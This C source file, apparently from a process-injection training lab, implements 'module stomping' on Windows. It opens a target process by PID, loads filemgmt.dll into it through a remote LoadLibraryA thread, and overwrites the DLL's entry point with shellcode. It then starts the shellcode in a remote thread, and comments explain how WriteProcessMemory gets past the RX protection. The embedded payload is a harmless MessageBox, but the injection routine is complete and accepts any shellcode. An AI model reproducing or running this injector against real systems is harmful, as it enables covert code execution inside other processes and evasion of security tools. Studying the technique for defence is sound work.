#ifndef UNICODE //helps mitigate error on line 31. Ref# https://stackoverflow.com/questions/13977388/error-cannot-convert-const-wchar-t-13-to-lpcstr-aka-const-char-in-assi
#define UNICODE
#define UNICODE_WAS_UNDEFINED
#endif

#include <windows.h>

#ifdef UNICODE_WAS_UNDEFINED
#undef UNICODE
#endif

#include <stdio.h>
#include <string.h>
#include <Psapi.h>

// helper functions - FindModuleBase and FindEntryPoint

/*
    FindModuleBase - Find the entry point address of the DLL.
    After loading the module inside the injected process by LoadLibraryA, we do not know the address of the Loaded DLL.
    FindModuleBase takes in the handle to the injected process and parses all modules (DLLs) while matching them to the target DLL name.
    The function returns the handle to the target module (DLL).
*/
HMODULE FindModuleBase(HANDLE hProcess) {
    HMODULE hModuleList[1024];
    wchar_t moduleName[MAX_PATH];
    DWORD cb = sizeof(hModuleList);
    DWORD cbNeeded = 0;

    // Enum all module in the process

    if(EnumProcessModulesEx(hProcess, hModuleList, sizeof(hModuleList), &cbNeeded, LIST_MODULES_64BIT)) {
        int lastErr = GetLastError();
        for(unsigned int i = 0; i < (cbNeeded / sizeof(HMODULE)); i++) {
            // get full path of the module
            if (GetModuleFileNameEx(hProcess, hModuleList[i], moduleName, (sizeof(moduleName) / sizeof(DWORD)))) {
                if(wcsstr(moduleName, L"filemgmt.dll") != nullptr) {
                    return hModuleList[i];
                }
            }
        }
    }

    return 0;
}

/*
    FindEntryPoint - Find the address of the entry point within the DLL.
    By utilizing a tool such as CFF Explorer, the DLL can be parsed to analyse the strucure of DLL headers.
    The entry point of the DLL resides under NT Headers -> Optional Headers -> AddressOfEntryPoint.
    One needs to add the base address of the dll with the AddressOfEntryPoint to arrive at the absolute address.
    FindEntryPoint takes in handle to the target/injected process and handle to the injected module (dll).
    Then it parses the headers inside the injected module to find address of entry point and adds it to the address of the target process module.
    Finally, it returns this absolute address.
*/

LPVOID FindEntryPoint(HANDLE hProcess, HMODULE hModule) {
    LPVOID targetDllHeader = { 0 };
    DWORD sizeOfHeader = 0x1000;
    
    // allocate local heap
    targetDllHeader = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeOfHeader);
    // read header of target dlls
    ReadProcessMemory(hProcess, (LPVOID)hModule, targetDllHeader, sizeOfHeader, NULL);
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)targetDllHeader;
    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)targetDllHeader + dosHeader->e_lfanew);
    // getting entry point of target dll
    DWORD_PTR dllEntryPoint = ntHeader->OptionalHeader.AddressOfEntryPoint;
    wprintf(L"[+]dll entry point offset: %p\n", (LPVOID)dllEntryPoint);
    // entry point in memory: base address + entry point offset
    LPVOID dllEntryPointInMem = (LPVOID)(dllEntryPoint + (DWORD_PTR)hModule);
    wprintf(L"[+]dll entry point in memory: %p\n", dllEntryPointInMem);
    return dllEntryPointInMem;
}

BOOL ModuleStomping(unsigned char payload[], SIZE_T payload_size, int pid) {
    HANDLE hProcess = INVALID_HANDLE_VALUE;
    HANDLE hTargetModule = NULL;

    // module (or dll) to load
    #ifdef _WIN64
        LPCSTR targetLibrary = "C:\\Users\\vagrant\\Desktop\\CPIA-Work\\ProcessInjection\\ModuleStomping\\dll\\filemgmt.dll";
    #else
        LPCSTR targetLibrary = "C:\\non-existent";
    #endif

    LPVOID memBase;
    HMODULE moduleBase;
    LPVOID entryPoint = { 0 };
    printf("[!]Opening the target process with pid: %d\n", pid);
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
    if (hProcess == INVALID_HANDLE_VALUE) {
        printf("[-] Could not get handle to the target process. Error: %d\n", GetLastError());
        return FALSE;
    }

    size_t targetSize = lstrlenA(targetLibrary);
    // Allocating memory inside the target process
    memBase = VirtualAllocEx(hProcess, NULL, targetSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (memBase == 0) {
        printf("[-] Could not allocate memory inside the target process. Error: %d\n", GetLastError());
        return FALSE;
    }

    // writing the target library path to the above allocated memory location
    if(!WriteProcessMemory(hProcess, memBase, targetLibrary, targetSize, NULL)) {
        printf("[-] Could not write inside the process memory. Error: %d", GetLastError());
        return FALSE;
    }

    // Get address of the LoadLibraryA API and convert it to a thread routine
    LPTHREAD_START_ROUTINE loadModule = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    if (loadModule == NULL) {
        printf("[-] Could notfetch the address of the LoadLibraryA from kernel32.dll. Error: %d\n", GetLastError());
        return FALSE;
    }

    // Create a new thread inside the target process to load module (using LoadLibraryA). 
    // LoadLibraryA will allow us to load the targetLibrary (or module/dll) inside the target process.
    hTargetModule = CreateRemoteThread(hProcess, NULL, 0, loadModule, memBase, 0, NULL);
    if (hTargetModule == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to load module inside the target process. Error: %d\n", GetLastError());
        return FALSE;
    }

    printf("[+] Successfully loaded our module inside the target process\n");
    WaitForSingleObject(hTargetModule, 2000);

    moduleBase = FindModuleBase(hProcess);
    if (moduleBase == 0) {
        printf("[-] Could not search the target module inside the injected process\n");
        return FALSE;
    }

    entryPoint = FindEntryPoint(hProcess, moduleBase);

    // writing to the process memory
    /*
    The memory protection at the entrypoint of the DLL is RX. 
    However, we are still able to over-write our shell code at this location even without write permissions.
    This is possible due to the below WriteProcessMemory API.
    Link: https://doxygen.reactos.org/d9/dd7/dll_2win32_2kernel32_2client_2proc_8c.html#a0126f021bd719d97e646942198e427c5
    Gist - The WriteProcessMemory first makes the region permission to RWX and stores the old permission (our case - RX)
        - Next, it checks if Write permission was present and if not (which is our case), it hits the next block of if-else
        - In this else block, it check if the old permission was read-only or no-access. 
        - Since ours is RX, this condition is false, and we fall in to another block of if-else.
        - In this else block, the API writes into the memory and restores old permission.
    */
    if(!WriteProcessMemory(hProcess, entryPoint, payload, payload_size, NULL)) {
        printf("[-] Could not write shell code in the entry point of the loaded dll. Error: %d\n", GetLastError());
        return FALSE;
    }

    CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)entryPoint, NULL, 0, 0);
    printf("[+] Payload executed\n");

    return TRUE;
}


int main(int argc, char **argv) {
    if (argc < 2 || argc > 3) {
        printf("usage: filename.exe <PID>\n");
        exit(-1);
    }
    int pid = 0;
    pid = atoi(argv[1]);

    // MessageBox "hello world"
    unsigned char payload[] = "\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00\x00"
		"\x48\x8D\x0D\x52\x00\x00\x00\xE8\x9E\x00\x00\x00\x4C\x8B\xF8"
		"\x48\x8D\x0D\x5D\x00\x00\x00\xFF\xD0\x48\x8D\x15\x5F\x00\x00"
		"\x00\x48\x8D\x0D\x4D\x00\x00\x00\xE8\x7F\x00\x00\x00\x4D\x33"
		"\xC9\x4C\x8D\x05\x61\x00\x00\x00\x48\x8D\x15\x4E\x00\x00\x00"
		"\x48\x33\xC9\xFF\xD0\x48\x8D\x15\x56\x00\x00\x00\x48\x8D\x0D"
		"\x0A\x00\x00\x00\xE8\x56\x00\x00\x00\x48\x33\xC9\xFF\xD0\x4B"
		"\x45\x52\x4E\x45\x4C\x33\x32\x2E\x44\x4C\x4C\x00\x4C\x6F\x61"
		"\x64\x4C\x69\x62\x72\x61\x72\x79\x41\x00\x55\x53\x45\x52\x33"
		"\x32\x2E\x44\x4C\x4C\x00\x4D\x65\x73\x73\x61\x67\x65\x42\x6F"
		"\x78\x41\x00\x48\x65\x6C\x6C\x6F\x20\x77\x6F\x72\x6C\x64\x00"
		"\x4D\x65\x73\x73\x61\x67\x65\x00\x45\x78\x69\x74\x50\x72\x6F"
		"\x63\x65\x73\x73\x00\x48\x83\xEC\x28\x65\x4C\x8B\x04\x25\x60"
		"\x00\x00\x00\x4D\x8B\x40\x18\x4D\x8D\x60\x10\x4D\x8B\x04\x24"
		"\xFC\x49\x8B\x78\x60\x48\x8B\xF1\xAC\x84\xC0\x74\x26\x8A\x27"
		"\x80\xFC\x61\x7C\x03\x80\xEC\x20\x3A\xE0\x75\x08\x48\xFF\xC7"
		"\x48\xFF\xC7\xEB\xE5\x4D\x8B\x00\x4D\x3B\xC4\x75\xD6\x48\x33"
		"\xC0\xE9\xA7\x00\x00\x00\x49\x8B\x58\x30\x44\x8B\x4B\x3C\x4C"
		"\x03\xCB\x49\x81\xC1\x88\x00\x00\x00\x45\x8B\x29\x4D\x85\xED"
		"\x75\x08\x48\x33\xC0\xE9\x85\x00\x00\x00\x4E\x8D\x04\x2B\x45"
		"\x8B\x71\x04\x4D\x03\xF5\x41\x8B\x48\x18\x45\x8B\x50\x20\x4C"
		"\x03\xD3\xFF\xC9\x4D\x8D\x0C\x8A\x41\x8B\x39\x48\x03\xFB\x48"
		"\x8B\xF2\xA6\x75\x08\x8A\x06\x84\xC0\x74\x09\xEB\xF5\xE2\xE6"
		"\x48\x33\xC0\xEB\x4E\x45\x8B\x48\x24\x4C\x03\xCB\x66\x41\x8B"
		"\x0C\x49\x45\x8B\x48\x1C\x4C\x03\xCB\x41\x8B\x04\x89\x49\x3B"
		"\xC5\x7C\x2F\x49\x3B\xC6\x73\x2A\x48\x8D\x34\x18\x48\x8D\x7C"
		"\x24\x30\x4C\x8B\xE7\xA4\x80\x3E\x2E\x75\xFA\xA4\xC7\x07\x44"
		"\x4C\x4C\x00\x49\x8B\xCC\x41\xFF\xD7\x49\x8B\xCC\x48\x8B\xD6"
		"\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3";

    SIZE_T payload_size = sizeof(payload);

    BOOL status;
    status = ModuleStomping(payload, payload_size, pid);
    if (!status) {
        printf("[-] Module stomping failed\n");
    }

    return 0;
}